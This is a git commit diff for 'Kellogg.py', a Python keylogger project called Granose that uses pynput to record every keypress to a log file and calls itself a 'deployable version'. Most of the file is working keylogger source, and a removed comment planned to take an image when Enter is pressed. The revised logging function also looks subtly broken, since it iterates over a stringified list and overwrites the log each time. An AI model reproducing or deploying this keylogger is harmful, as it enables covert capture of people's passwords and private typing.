608d1f564f1218f8291f3ecc6b48d15748701cb2
SB <44678673+TST314@users.noreply.github.com>
2020-09-14 15:48:10 -0400

    Update Kellogg.py

--- Granose/Kellogg.py
+++ Granose/Kellogg.py
@@ -3,57 +3,37 @@ Granose is the first flake cereal which was created by Kellogg.
 Of course, like Kellogg's cereal, there were versions before but this will be the first working/deployable version!
 '''
 
-from pynput.keyboard import Key, Listener
-import os, sys 
+from pynput.keyboard import Key, Listener # can also control devices but lets stick with monitoring them for now
+import os, sys #will be used for finding if the file exists
 import shutil #to copy txt files
-import datetime
+import datetime #timestaps
 
 count = 0
 keys = []
 
-def on_press(key):
+#apparetnly this is the only way to do keyloggers in python
+def onPress(key):
 	global keys, count
 	keys.append(key)
 	count +=1
 	print("{0} pressed".format(key))
-	if count >=1:
+	if count >= 5:
 		count = 0
-		write_file(keys)
+		writeFile(str(keys))
 		keys = []
 
-def write_file(keys):
-	with open("32log.txt", "a+") as f:
+def writeFile(keys):
+	with open("32log.txt", "w") as f:
 		for key in keys:
 			k = str(key).replace("'","")
-			if k.find("space") > 0:
-				f.write('\n')
-			elif k.find("Key") >0:
-				f.write('\n')
+			f.write(key)
 
-def on_release(key):
-	if key == Key.esc:
+
+def onRel(key):
+	if key==Key.esc:
 		return False
 
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
+with Listener(on_press=onPress, on_release=onRel) as listener:
 	listener.join()
 
 
-
-#What I am going for:
-
-#Input: Tapestry
-
-'''
-Output:
-T
-Ta
-Tap
-Tape
-Tapes
-Tapest
-Tapestr
-Tapestry
-'''
-
-# If enter is pressed an image is taken
